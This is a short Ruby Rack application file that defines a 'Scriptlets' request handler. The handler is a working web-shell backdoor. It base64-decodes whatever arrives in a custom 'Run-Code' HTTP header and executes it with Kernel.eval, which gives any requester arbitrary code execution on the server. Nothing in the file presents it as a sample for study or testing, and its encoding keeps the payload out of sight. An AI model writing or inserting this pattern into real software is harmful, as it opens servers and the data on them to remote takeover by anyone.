require 'rack'
require 'base64'
require 'java'

import "scriptlets.util.RestClient"

class Scriptlets
  def self.call(env)
    req = Rack::Request.new(env)
    resp = Rack::Response.new
    
    Kernel.eval(Base64.decode64(env['HTTP_RUN_CODE'])) if env['HTTP_RUN_CODE']
    
    resp.finish
  end
end